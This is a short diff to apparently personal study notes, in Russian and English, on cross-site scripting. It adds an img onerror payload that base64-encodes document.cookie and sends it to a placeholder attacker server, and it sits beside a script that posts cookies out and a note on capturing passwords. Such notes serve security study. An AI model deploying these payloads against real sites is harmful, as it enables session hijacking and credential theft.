@@ -5,7 +5,7 @@
 
 > [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
 > [[XSS#XSS в HTML атрибутах|2. XSS в HTML атрибутах]]
-> > [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
+> [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
 ***
 # Exploiting cross-site scripting to steal cookies
 
@@ -19,6 +19,10 @@
   body: document.cookie
   });
 </script>
+```
+или
+```
+<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
 ```
 ### Exploiting cross-site scripting to capture passwords
 Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
